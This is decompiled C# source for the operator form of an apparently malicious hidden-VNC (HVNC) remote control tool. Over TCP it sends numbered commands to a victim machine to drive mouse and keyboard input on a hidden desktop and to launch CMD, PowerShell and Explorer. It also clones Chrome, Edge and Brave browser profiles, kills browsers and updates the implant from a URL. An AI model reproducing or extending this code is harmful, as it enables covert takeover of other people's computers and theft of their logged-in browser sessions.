using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Siticone.Desktop.UI.WinForms;

namespace HVNC
{
	// Token: 0x0200001F RID: 31
	public partial class FrmVNC : Form
	{
		// Token: 0x17000027 RID: 39
		// (get) Token: 0x060000DC RID: 220 RVA: 0x00002697 File Offset: 0x00000897
		// (set) Token: 0x060000DD RID: 221 RVA: 0x0000269F File Offset: 0x0000089F
		public PictureBox VNCBoxe
		{
			get
			{
				return this.VNCBox;
			}
			set
			{
				this.VNCBox = value;
			}
		}

		// Token: 0x17000028 RID: 40
		// (get) Token: 0x060000DE RID: 222 RVA: 0x000026A8 File Offset: 0x000008A8
		// (set) Token: 0x060000DF RID: 223 RVA: 0x000026B0 File Offset: 0x000008B0
		public ToolStripStatusLabel toolStripStatusLabel2_
		{
			get
			{
				return this.toolStripStatusLabel2;
			}
			set
			{
				this.toolStripStatusLabel2 = value;
			}
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x0000D964 File Offset: 0x0000BB64
		public FrmVNC()
		{
			this.int_0 = 0;
			this.bool_1 = true;
			this.bool_2 = false;
			this.FrmTransfer0 = new FrmTransfer();
			this.InitializeComponent();
			this.VNCBox.MouseEnter += this.VNCBox_MouseEnter;
			this.VNCBox.MouseLeave += this.VNCBox_MouseLeave;
			this.VNCBox.KeyPress += this.VNCBox_KeyPress;
		}

		// Token: 0x060000E1 RID: 225 RVA: 0x000026B9 File Offset: 0x000008B9
		private void VNCBox_MouseEnter(object sender, EventArgs e)
		{
			this.VNCBox.Focus();
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x000026C7 File Offset: 0x000008C7
		private void VNCBox_MouseLeave(object sender, EventArgs e)
		{
			base.FindForm().ActiveControl = null;
			base.ActiveControl = null;
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x000026DC File Offset: 0x000008DC
		private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
		{
			this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x0000D9E4 File Offset: 0x0000BBE4
		private void VNCForm_Load(object sender, EventArgs e)
		{
			if (this.FrmTransfer0.IsDisposed)
			{
				this.FrmTransfer0 = new FrmTransfer();
			}
			this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
			this.tcpClient_0 = (TcpClient)base.Tag;
			this.VNCBox.Tag = new Size(1028, 1028);
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x0000DA50 File Offset: 0x0000BC50
		public void Check()
		{
			try
			{
				if (this.FrmTransfer0.FileTransferLabele.Text == null)
				{
					this.toolStripStatusLabel3.Text = "Status";
				}
				else
				{
					this.toolStripStatusLabel3.Text = this.FrmTransfer0.FileTransferLabele.Text;
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x000026FF File Offset: 0x000008FF
		private void timer1_Tick(object sender, EventArgs e)
		{
			checked
			{
				this.int_0 += 100;
				if (this.int_0 >= SystemInformation.DoubleClickTime)
				{
					this.bool_1 = true;
					this.bool_2 = false;
					this.int_0 = 0;
				}
			}
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x00002732 File Offset: 0x00000932
		private void CopyBtn_Click(object sender, EventArgs e)
		{
			this.SendTCP("9*", this.tcpClient_0);
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x0000DAB4 File Offset: 0x0000BCB4
		private void PasteBtn_Click(object sender, EventArgs e)
		{
			try
			{
				this.SendTCP("10*" + Clipboard.GetText(), this.tcpClient_0);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x00002745 File Offset: 0x00000945
		private void ShowStart_Click(object sender, EventArgs e)
		{
			this.SendTCP("13*", this.tcpClient_0);
		}

		// Token: 0x060000EA RID: 234 RVA: 0x0000DAFC File Offset: 0x0000BCFC
		private void VNCBox_MouseDown(object sender, MouseEventArgs e)
		{
			if (this.bool_1)
			{
				this.bool_1 = false;
				this.timer1.Start();
			}
			else if (this.int_0 < SystemInformation.DoubleClickTime)
			{
				this.bool_2 = true;
			}
			Point location = e.Location;
			object tag = this.VNCBox.Tag;
			Size size = (tag != null) ? ((Size)tag) : default(Size);
			double num = (double)this.VNCBox.Width / (double)size.Width;
			double num2 = (double)this.VNCBox.Height / (double)size.Height;
			double value = Math.Ceiling((double)location.X / num);
			double value2 = Math.Ceiling((double)location.Y / num2);
			if (this.bool_2)
			{
				if (e.Button == MouseButtons.Left)
				{
					this.SendTCP("6*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
					return;
				}
			}
			else
			{
				if (e.Button == MouseButtons.Left)
				{
					this.SendTCP("2*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
					return;
				}
				if (e.Button == MouseButtons.Right)
				{
					this.SendTCP("3*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
				}
			}
		}

		// Token: 0x060000EB RID: 235 RVA: 0x0000DC64 File Offset: 0x0000BE64
		private void VNCBox_MouseUp(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = this.VNCBox.Tag;
			Size size = (tag != null) ? ((Size)tag) : default(Size);
			double num = (double)this.VNCBox.Width / (double)size.Width;
			double num2 = (double)this.VNCBox.Height / (double)size.Height;
			double value = Math.Ceiling((double)location.X / num);
			double value2 = Math.Ceiling((double)location.Y / num2);
			if (e.Button == MouseButtons.Left)
			{
				this.SendTCP("4*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
				return;
			}
			if (e.Button == MouseButtons.Right)
			{
				this.SendTCP("5*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
			}
		}

		// Token: 0x060000EC RID: 236 RVA: 0x0000DD58 File Offset: 0x0000BF58
		private void VNCBox_MouseMove(object sender, MouseEventArgs e)
		{
			Point location = e.Location;
			object tag = this.VNCBox.Tag;
			Size size = (tag != null) ? ((Size)tag) : default(Size);
			double num = (double)this.VNCBox.Width / (double)size.Width;
			double num2 = (double)this.VNCBox.Height / (double)size.Height;
			double value = Math.Ceiling((double)location.X / num);
			double value2 = Math.Ceiling((double)location.Y / num2);
			this.SendTCP("8*" + Conversions.ToString(value) + "*" + Conversions.ToString(value2), this.tcpClient_0);
		}

		// Token: 0x060000ED RID: 237 RVA: 0x0000DE08 File Offset: 0x0000C008
		private void IntervalScroll_Scroll(object sender, EventArgs e)
		{
			this.IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(this.IntervalScroll.Value);
			this.SendTCP("17*" + Conversions.ToString(this.IntervalScroll.Value), this.tcpClient_0);
		}

		// Token: 0x060000EE RID: 238 RVA: 0x0000DE60 File Offset: 0x0000C060
		private void QualityScroll_Scroll(object sender, EventArgs e)
		{
			this.QualityLabel.Text = "Quality : " + Conversions.ToString(this.QualityScroll.Value) + "%";
			this.SendTCP("18*" + Conversions.ToString(this.QualityScroll.Value), this.tcpClient_0);
		}

		// Token: 0x060000EF RID: 239 RVA: 0x0000DEC0 File Offset: 0x0000C0C0
		private void ResizeScroll_Scroll(object sender, EventArgs e)
		{
			this.chkClone1.Text = "Resize : " + Conversions.ToString(this.ResizeScroll.Value) + "%";
			this.SendTCP("19*" + Conversions.ToString((double)this.ResizeScroll.Value / 100.0), this.tcpClient_0);
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x00002758 File Offset: 0x00000958
		private void RestoreMaxBtn_Click(object sender, EventArgs e)
		{
			this.SendTCP("15*", this.tcpClient_0);
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x0000276B File Offset: 0x0000096B
		private void MinBtn_Click(object sender, EventArgs e)
		{
			this.SendTCP("14*", this.tcpClient_0);
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x0000277E File Offset: 0x0000097E
		private void CloseBtn_Click(object sender, EventArgs e)
		{
			this.SendTCP("16*", this.tcpClient_0);
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x00002791 File Offset: 0x00000991
		private void StartExplorer_Click(object sender, EventArgs e)
		{
			this.SendTCP("21*", this.tcpClient_0);
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x0000DF28 File Offset: 0x0000C128
		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x000026DC File Offset: 0x000008DC
		private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
		{
			this.SendTCP("7*" + Conversions.ToString(e.KeyChar), this.tcpClient_0);
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x000027A4 File Offset: 0x000009A4
		private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
		{
			this.SendTCP("1*", this.tcpClient_0);
			this.VNCBox.Image = null;
			GC.Collect();
			base.Dispose();
			base.Close();
			e.Cancel = true;
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x000027DB File Offset: 0x000009DB
		private void VNCForm_Click(object sender, EventArgs e)
		{
			this.method_18(null);
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x000027E4 File Offset: 0x000009E4
		private void method_18(object object_0)
		{
			base.ActiveControl = (Control)object_0;
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x0000DFF4 File Offset: 0x0000C1F4
		private void button1_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Checked)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("30*" + Conversions.ToString(true), (TcpClient)base.Tag);
				return;
			}
			this.SendTCP("30*" + Conversions.ToString(false), (TcpClient)base.Tag);
		}

		// Token: 0x060000FA RID: 250 RVA: 0x000027F2 File Offset: 0x000009F2
		private void timer2_Tick(object sender, EventArgs e)
		{
			this.Check();
		}

		// Token: 0x060000FB RID: 251 RVA: 0x0000E08C File Offset: 0x0000C28C
		private void closeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				this.SendTCP("24*", this.tcpClient_0);
				base.Close();
			}
		}

		// Token: 0x060000FC RID: 252 RVA: 0x000024F0 File Offset: 0x000006F0
		private void button6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000FD RID: 253 RVA: 0x000027FA File Offset: 0x000009FA
		private void button7_Click(object sender, EventArgs e)
		{
			this.SendTCP("4875*", this.tcpClient_0);
		}

		// Token: 0x060000FE RID: 254 RVA: 0x0000280D File Offset: 0x00000A0D
		private void button8_Click(object sender, EventArgs e)
		{
			this.SendTCP("4876*", this.tcpClient_0);
		}

		// Token: 0x060000FF RID: 255 RVA: 0x0000DE08 File Offset: 0x0000C008
		private void IntervalScroll_Scroll(object sender, ScrollEventArgs e)
		{
			this.IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(this.IntervalScroll.Value);
			this.SendTCP("17*" + Conversions.ToString(this.IntervalScroll.Value), this.tcpClient_0);
		}

		// Token: 0x06000100 RID: 256 RVA: 0x0000DEC0 File Offset: 0x0000C0C0
		private void ResizeScroll_Scroll(object sender, ScrollEventArgs e)
		{
			this.chkClone1.Text = "Resize : " + Conversions.ToString(this.ResizeScroll.Value) + "%";
			this.SendTCP("19*" + Conversions.ToString((double)this.ResizeScroll.Value / 100.0), this.tcpClient_0);
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000E0DC File Offset: 0x0000C2DC
		private void QualityScroll_Scroll(object sender, ScrollEventArgs e)
		{
			this.QualityLabel.Text = "HQ : " + Conversions.ToString(this.QualityScroll.Value) + "%";
			this.SendTCP("18*" + Conversions.ToString(this.QualityScroll.Value), this.tcpClient_0);
		}

		// Token: 0x06000102 RID: 258 RVA: 0x0000E13C File Offset: 0x0000C33C
		private void guna2Button2_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				this.SendTCP("24*", this.tcpClient_0);
				base.Close();
			}
		}

		// Token: 0x06000103 RID: 259 RVA: 0x000026B9 File Offset: 0x000008B9
		private void VNCBox_MouseHover(object sender, EventArgs e)
		{
			this.VNCBox.Focus();
		}

		// Token: 0x06000104 RID: 260 RVA: 0x00002820 File Offset: 0x00000A20
		private void guna2Button3_Click(object sender, EventArgs e)
		{
			if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connection ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				base.Close();
			}
		}

		// Token: 0x06000105 RID: 261 RVA: 0x00002791 File Offset: 0x00000991
		private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("21*", this.tcpClient_0);
		}

		// Token: 0x06000106 RID: 262 RVA: 0x0000280D File Offset: 0x00000A0D
		private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("4876*", this.tcpClient_0);
		}

		// Token: 0x06000107 RID: 263 RVA: 0x000027FA File Offset: 0x000009FA
		private void cMDToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("4875*", this.tcpClient_0);
		}

		// Token: 0x06000108 RID: 264 RVA: 0x00002745 File Offset: 0x00000945
		private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("13*", this.tcpClient_0);
		}

		// Token: 0x06000109 RID: 265 RVA: 0x0000E18C File Offset: 0x0000C38C
		private void test1ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Checked)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("11*" + Conversions.ToString(true), (TcpClient)base.Tag);
				return;
			}
			this.SendTCP("11*" + Conversions.ToString(false), (TcpClient)base.Tag);
		}

		// Token: 0x0600010A RID: 266 RVA: 0x0000E224 File Offset: 0x0000C424
		private void test2ToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Checked)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("12*" + Conversions.ToString(true), (TcpClient)base.Tag);
				return;
			}
			this.SendTCP("12*" + Conversions.ToString(false), (TcpClient)base.Tag);
		}

		// Token: 0x0600010B RID: 267 RVA: 0x0000E2BC File Offset: 0x0000C4BC
		private void braveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Checked)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("32*" + Conversions.ToString(true), (TcpClient)base.Tag);
				return;
			}
			this.SendTCP("32*" + Conversions.ToString(false), (TcpClient)base.Tag);
		}

		// Token: 0x0600010C RID: 268 RVA: 0x0000DFF4 File Offset: 0x0000C1F4
		private void edgeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.chkClone.Checked)
			{
				if (this.FrmTransfer0.IsDisposed)
				{
					this.FrmTransfer0 = new FrmTransfer();
				}
				this.FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
				this.FrmTransfer0.Hide();
				this.SendTCP("30*" + Conversions.ToString(true), (TcpClient)base.Tag);
				return;
			}
			this.SendTCP("30*" + Conversions.ToString(false), (TcpClient)base.Tag);
		}

		// Token: 0x0600010D RID: 269 RVA: 0x00002851 File Offset: 0x00000A51
		public void hURL(string url)
		{
			this.SendTCP("8585* " + url, (TcpClient)base.Tag);
		}

		// Token: 0x0600010E RID: 270 RVA: 0x0000286F File Offset: 0x00000A6F
		public void UpdateClient(string url)
		{
			this.SendTCP("8589* " + url, (TcpClient)base.Tag);
		}

		// Token: 0x0600010F RID: 271 RVA: 0x0000288D File Offset: 0x00000A8D
		public void CloseClient()
		{
			this.SendTCP("24*", (TcpClient)base.Tag);
		}

		// Token: 0x06000110 RID: 272 RVA: 0x000028A5 File Offset: 0x00000AA5
		public void ResetScale()
		{
			this.SendTCP("8587*", (TcpClient)base.Tag);
		}

		// Token: 0x06000111 RID: 273 RVA: 0x000028BD File Offset: 0x00000ABD
		public void KillChrome()
		{
			this.SendTCP("8586*", (TcpClient)base.Tag);
		}

		// Token: 0x06000112 RID: 274 RVA: 0x000024F0 File Offset: 0x000006F0
		private void exportbtn_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000113 RID: 275 RVA: 0x000028D5 File Offset: 0x00000AD5
		private void copyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("3307*", this.tcpClient_0);
		}

		// Token: 0x06000114 RID: 276 RVA: 0x000028E8 File Offset: 0x00000AE8
		private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.SendTCP("3306*" + Clipboard.GetText(), (TcpClient)base.Tag);
		}

		// Token: 0x06000115 RID: 277 RVA: 0x0000E354 File Offset: 0x0000C554
		private void ToggleHVNC_CheckedChanged(object sender, EventArgs e)
		{
			if (this.ToggleHVNC.Checked)
			{
				this.SendTCP("0*", this.tcpClient_0);
				this.FrmTransfer0.FileTransferLabele.Text = "HVNC Started!";
				return;
			}
			if (!this.ToggleHVNC.Checked)
			{
				this.SendTCP("1*", this.tcpClient_0);
				this.VNCBox.Image = null;
				this.FrmTransfer0.FileTransferLabele.Text = "HVNC Stopped!";
				GC.Collect();
				return;
			}
		}

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x06000116 RID: 278 RVA: 0x0000290A File Offset: 0x00000B0A
		// (set) Token: 0x06000117 RID: 279 RVA: 0x00002911 File Offset: 0x00000B11
		public static string labelstatus { get; set; }

		// Token: 0x06000118 RID: 280 RVA: 0x0000E3DC File Offset: 0x0000C5DC
		private void toolStripStatusLabel3_TextChanged(object sender, EventArgs e)
		{
			FrmVNC.labelstatus = this.FrmTransfer0.FileTransferLabele.Text;
			if (FrmVNC.labelstatus == "Idle")
			{
				this.statusled.FillColor = Color.White;
				return;
			}
			if (FrmVNC.labelstatus.Contains("MB"))
			{
				this.ledstatus.Text = "Cloning Profile...";
				this.statusled.FillColor = Color.Yellow;
				return;
			}
			if (FrmVNC.labelstatus.Contains("initiated"))
			{
				this.ledstatus.Text = "Profile Cloned";
				this.statusled.FillColor = Color.FromArgb(4, 143, 110);
				return;
			}
		}

		// Token: 0x0400009F RID: 159
		private TcpClient tcpClient_0;

		// Token: 0x040000A0 RID: 160
		private int int_0;

		// Token: 0x040000A1 RID: 161
		private bool bool_1;

		// Token: 0x040000A2 RID: 162
		private bool bool_2;

		// Token: 0x040000A3 RID: 163
		public FrmTransfer FrmTransfer0;
	}
}
